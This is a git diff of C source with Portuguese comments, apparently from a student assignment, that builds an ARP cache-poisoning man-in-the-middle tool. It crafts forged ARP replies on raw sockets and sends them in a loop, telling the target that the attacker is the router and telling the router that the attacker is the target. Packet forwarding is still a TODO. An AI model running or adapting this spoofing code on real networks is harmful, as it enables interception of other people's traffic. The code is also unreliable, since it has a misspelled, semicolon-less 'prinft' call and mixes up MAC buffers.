@@ -10,6 +10,8 @@
 #include <arpa/inet.h>
 #include <linux/if_packet.h>
 #include <pthread.h>
+#include <stdint.h>
+#include <inttypes.h>
 
 #define MAC_ADDR_LEN 6
 #define BUFFER_SIZE 1600
@@ -39,6 +41,7 @@ struct _arp_hdr {
 char ifname[IFNAMSIZ];
 char target_ip[15];
 char target_mac[17];
+char target_mac_router[17];
 
 
 int potencia(int base, int expoente){
@@ -183,7 +186,7 @@ int setArpTable(char *ip, char *mac){
 	return 0;
 }
 
-void getmactarget(char *ip){
+void getmactarget(char *ip,int find_router){
 
 	FILE *pFile;
 	pFile = fopen("arp_table.txt", "r");
@@ -201,8 +204,12 @@ void getmactarget(char *ip){
 			str = strtok (NULL, "\t");
 			strcpy(line_mac, str);
 
-			if(strcmp(line_ip, ip) == 0){     
-				strcpy(target_mac,line_mac);				
+			if(strcmp(line_ip, ip) == 0){ 
+				if(find_router == 1){
+					strcpy(target_mac_router,line_mac);	
+				}else{
+					strcpy(target_mac,line_mac);				
+				}    
 				break;
 			}		
 		}
@@ -259,6 +266,7 @@ void * redirect(void *args)
 		printf("MAC origem:  %s\n", sender_mac);
 
 		printf("EtherType: 0x%04x\n", e_type);
+		prinft("\n\n")
 
 		// TODO: Verify if have to redirect the buffer
 		// TODO: Redirect the buffer changing mac		
@@ -269,7 +277,144 @@ void * redirect(void *args)
     pthread_exit(NULL);
 }
 
-void * poisoning(void *args){
+
+
+void sendarprouter(){
+
+	int fd;
+	struct ifreq if_idx;
+	struct ifreq if_mac;
+	struct sockaddr_ll socket_address;
+	int frame_len = 0;
+	char buffer[BUFFER_SIZE];
+	short int ethertype = htons(0x0806);
+
+
+	arp_hdr arphdr_router;
+
+	/* Cria um descritor de socket do tipo RAW */
+	if ((fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
+		perror("socket");
+		exit(1);
+	}
+
+	/* Obtem o indice da interface de rede */
+	memset(&if_idx, 0, sizeof (struct ifreq));
+	strncpy(if_idx.ifr_name, ifname, IFNAMSIZ - 1);
+	if (ioctl(fd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		exit(1);
+	}
+
+
+	/* Obtem o endereco MAC da interface local */
+	memset(&if_mac, 0, sizeof (struct ifreq));
+	strncpy(if_mac.ifr_name, ifname, IFNAMSIZ - 1);
+	if (ioctl(fd, SIOCGIFHWADDR, &if_mac) < 0) {
+		perror("SIOCGIFHWADDR");
+		exit(1);
+	}
+
+
+	/* =================== INFORMAR O IP DO ROUTER ============*/
+	//IP original
+	char sender_ip[15];
+	//Auxiliar para fatear o ip
+	unsigned char sender_byte[4];
+	//Auxiliar para shiftar o ip
+	int s_ip = 0;
+	//Pegar meu ip
+	s_ip = getip(ifname, sender_ip);
+	//Meu Ip fateado
+    sender_byte[0] = s_ip & 0xFF;
+    sender_byte[1] = (s_ip >> 8) & 0xFF;
+    sender_byte[2] = (s_ip >> 16) & 0xFF;
+    //SIMULA SER O ROTEADOR
+	sender_byte[3] = 1;
+	// set host number
+	memset(sender_ip, 0, sizeof(sender_ip));
+	sprintf(sender_ip, "%d.%d.%d.%d", sender_byte[0],sender_byte[1],sender_byte[2],sender_byte[3]);
+
+	//MEXI AQUI busca o endereco mac do alvo no arquivo txt
+	getmactarget(sender_ip,1);
+
+
+	/*=========== PREPARE SOCKADDR_LL =============*/
+ 	/* Indice da interface de rede */
+	socket_address.sll_ifindex = if_idx.ifr_ifindex;
+	/* Tamanho do endereco (ETH_ALEN = 6) */
+	socket_address.sll_halen = ETH_ALEN;
+	/* Endereco MAC de destino */
+	memcpy(socket_address.sll_addr, target_mac_router, MAC_ADDR_LEN);
+	
+
+	/*============== MONTA CABECALHO ARP =========*/
+	/* Hardware type (16 bits): 1 for ethernet */
+	arphdr_router.htype = htons (1);
+	/* Protocol type (16 bits): 2048 for IP */
+	arphdr_router.ptype = htons (ETH_P_IP);
+	/* Hardware address length (8 bits): 6 bytes for MAC address */
+	arphdr_router.hlen = 6;
+	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
+	arphdr_router.plen = 4;
+	/* OpCode: 2 for ARP  replay */
+	arphdr_router.opcode = htons (2);
+	//informa hardware address de origem
+	memcpy (&arphdr_router.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+	
+	/* VERIFICAR COM O PROFESSOR, NAO CONSEGUI INFORMAR O MAC DO DESTINATARIO 
+	   Target hardware address destino  */	
+	//memset (&arphdr.target_mac, target_mac, sizeof (target_mac));
+	memset (&arphdr_router.target_mac, 0, 6 * sizeof (uint8_t));
+	
+
+	/*==== AQUI ESTA O TOQUE ME VOI ===*/
+	//salva o ip do TARGET como se ele tivesse enviado
+	inet_pton (AF_INET, target_ip, &arphdr_router.sender_ip);
+	
+	//inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
+	//Informa o ip alvo que recebe o pacote, neste caso o ROUTER
+	inet_pton (AF_INET, sender_ip, &arphdr_router.target_ip);
+
+
+	/*============= PREENCHE BUFFER ==============*/
+	/* Preenche o buffer com 0s */
+	memset(buffer, 0, BUFFER_SIZE);
+	/* Preenche o campo de endereco MAC de destino  - NAO TEMOS O ENDERECO MAC DO ROTEADOR*/	
+	memcpy(buffer, target_mac, MAC_ADDR_LEN);
+	frame_len += MAC_ADDR_LEN;
+	/* Preenche o campo de endereco MAC de origem */
+	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
+	frame_len += MAC_ADDR_LEN;
+	/* Preenche o campo EtherType */
+	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
+	frame_len += sizeof(ethertype);
+	/* Preenche o buffer com os dados do arp */
+	memcpy (buffer + frame_len, &arphdr_router, ARP_HDRLEN * sizeof (uint8_t));
+	frame_len += ARP_HDRLEN;
+
+	// Envia pacote 
+	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
+		perror("send");
+		close(fd);
+		exit(1);
+	}
+
+	if(IF_DEBUG){
+			printf("***********ROUTER********** \n");
+			printf("IP_SUMULADO: %s\t MAC_ORIGEM: %02x:%02x:%02x:%02x:%02x:%02x\n",target_ip, 
+						target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
+			prinft("\n\n")
+	}
+
+	close(fd);
+
+
+}
+
+
+void sendarptarget(){
+
 	int fd;
 	struct ifreq if_idx;
 	struct ifreq if_mac;
@@ -279,9 +424,8 @@ void * poisoning(void *args){
 	//MEXI AQUI char dest_mac[] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; //broadcast
 	short int ethertype = htons(0x0806);
 
-
 	//MEXI AQUI busca o mac do alvo no arquivo txt
-	getmactarget(target_ip);
+	getmactarget(target_ip,0);
 
 	arp_hdr arphdr;
 
@@ -308,110 +452,112 @@ void * poisoning(void *args){
 		exit(1);
 	}
 
-	/* Indice da interface de rede */
-	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 
+	/* =================== INFORMAR O IP QUE SERA SIMULADO ============*/
+	//IP original
+	char sender_ip[15];
+	//Auxiliar para fatear o ip
+	unsigned char sender_byte[4];
+	//Auxiliar para shiftar o ip
+	int s_ip = 0;
+	//Pegar meu ip
+	s_ip = getip(ifname, sender_ip);
+	//Meu Ip fateado
+    sender_byte[0] = s_ip & 0xFF;
+    sender_byte[1] = (s_ip >> 8) & 0xFF;
+    sender_byte[2] = (s_ip >> 16) & 0xFF;
+    //SIMULA SER O ROTEADOR
+	sender_byte[3] = 1;
+	// set host number
+	memset(sender_ip, 0, sizeof(sender_ip));
+	sprintf(sender_ip, "%d.%d.%d.%d", sender_byte[0],sender_byte[1],sender_byte[2],sender_byte[3]);
+
+
+	/*=========== PREPARE SOCKADDR_LL =============*/
+   /* Indice da interface de rede */
+	socket_address.sll_ifindex = if_idx.ifr_ifindex;
 	/* Tamanho do endereco (ETH_ALEN = 6) */
 	socket_address.sll_halen = ETH_ALEN;
-
 	/* Endereco MAC de destino */
 	//MEXI AQUI memcpy(socket_address.sll_addr, dest_mac, MAC_ADDR_LEN);
 	memcpy(socket_address.sll_addr, target_mac, MAC_ADDR_LEN);
+	
 
+	/*============== MONTA CABECALHO ARP =========*/
+	/* Hardware type (16 bits): 1 for ethernet */
+	arphdr.htype = htons (1);
+	/* Protocol type (16 bits): 2048 for IP */
+	arphdr.ptype = htons (ETH_P_IP);
+	/* Hardware address length (8 bits): 6 bytes for MAC address */
+	arphdr.hlen = 6;
+	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
+	arphdr.plen = 4;
+	/* OpCode: 2 for ARP  replay */
+	arphdr.opcode = htons (2);
+	//informa hardware address de origem
+	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
+	
+	/* VERIFICAR COM O PROFESSOR, NAO CONSEGUI INFORMAR O MAC DO DESTINATARIO  - Target hardware address destino  */	
+	//memset (&arphdr.target_mac, target_mac, sizeof (target_mac));
+	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
+	
+	//salva o ip do roteador como se ele tivesse enviado
+	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
+	//inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
+	//Informa o ip alvo que recebe o pacote
+	inet_pton (AF_INET, target_ip, &arphdr.target_ip);
+
+
+	/*============= PREENCHE BUFFER ==============*/
 	/* Preenche o buffer com 0s */
 	memset(buffer, 0, BUFFER_SIZE);
-
-	/* Monta o cabecalho Ethernet */
-
 	/* Preenche o campo de endereco MAC de destino */	
-	// MEXI AQUI memcpy(buffer, dest_mac, MAC_ADDR_LEN);
 	memcpy(buffer, target_mac, MAC_ADDR_LEN);
-	
 	frame_len += MAC_ADDR_LEN;
-
 	/* Preenche o campo de endereco MAC de origem */
-	//memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
-	
-
+	memcpy(buffer + frame_len, if_mac.ifr_hwaddr.sa_data, MAC_ADDR_LEN);
 	frame_len += MAC_ADDR_LEN;
-
 	/* Preenche o campo EtherType */
 	memcpy(buffer + frame_len, &ethertype, sizeof(ethertype));
 	frame_len += sizeof(ethertype);
-
-	/* Monta o cabecalho ARP */
-
-	/* Hardware type (16 bits): 1 for ethernet */
-	arphdr.htype = htons (1);
-
-	/* Protocol type (16 bits): 2048 for IP */
-	arphdr.ptype = htons (ETH_P_IP);
-
-	/* Hardware address length (8 bits): 6 bytes for MAC address */
-	arphdr.hlen = 6;
-
-	/* Protocol address length (8 bits): 4 bytes for IPv4 address */
-	arphdr.plen = 4;
-
-	/* OpCode: 1 for ARP request */
-	//MEXI AQUI -> EXECUTA UM REPLAY NO DESTINO
-	//arphdr.opcode = htons (1);
-	arphdr.opcode = htons (2);
-
-	memcpy (&arphdr.sender_mac, if_mac.ifr_hwaddr.sa_data, 6 * sizeof (uint8_t));
-
-	/* Target hardware address (48 bits): zero, since we don't know it yet. */
-	memset (&arphdr.target_mac, 0, 6 * sizeof (uint8_t));
-	
-	// help vars for multiple sends
-	char sender_ip[15];
-	unsigned char target_byte[4];
-	int s_ip = 0;
-	
-	// get sender ip
-	s_ip = getip(ifname, sender_ip);
-
-
-	//Meu Ip fateado
-    target_byte[0] = s_ip & 0xFF;
-    target_byte[1] = (s_ip >> 8) & 0xFF;
-    target_byte[2] = (s_ip >> 16) & 0xFF;
-
-    //SIMULA SER O ROTEADOR
-	target_byte[3] = 1;
-
-	// set host number
-	memset(sender_ip, 0, sizeof(sender_ip));
-	sprintf(sender_ip, "%d.%d.%d.%d", target_byte[0],target_byte[1],target_byte[2],target_byte[3]);
-
-	//
-	inet_pton (AF_INET, sender_ip, &arphdr.sender_ip);
-	//
-	inet_pton (AF_INET, target_ip, &arphdr.sender_ip);
-	//IP ALVO
-	inet_pton (AF_INET, target_ip, &arphdr.target_ip);
-
+	/* Preenche o buffer com os dados do arp */
 	memcpy (buffer + frame_len, &arphdr, ARP_HDRLEN * sizeof (uint8_t));
 	frame_len += ARP_HDRLEN;
 
+	// Envia pacote 
+	if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
+		perror("send");
+		close(fd);
+		exit(1);
+	}
+
+	if(IF_DEBUG){
+			printf("***********TARGET********** \n");
+			printf("IP_ALVO: %s\t MAC_ORIGEM: %02x:%02x:%02x:%02x:%02x:%02x\n",target_ip, 
+						target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);
+			prinft("\n\n")
+	}
+
+	close(fd);
+}
+
+
+void * poisoning(void *args){
+
 	while(1){
-		// Envia pacote 
-		if (sendto(fd, buffer, frame_len, 0, (struct sockaddr *) &socket_address, sizeof (struct sockaddr_ll)) < 0) {
-			perror("send");
-			close(fd);
-			exit(1);
-		}
 
-		if(IF_DEBUG){
-			printf("Poisoning\tARP\t%s? at %s\n", target_ip, arphdr.sender_mac);
-		}
-
+		//Envia meu endereco mac para o target informando que sou o router
+		sendarptarget();
+	
 		sleep(2);
+
+		//Envia para o router meu endereco mac informando que sou o target
+		sendarprouter();
 	}
 	
-	close(fd);
     pthread_exit(NULL);
 }
+
 
 int main(int argc, char *argv[])
 {
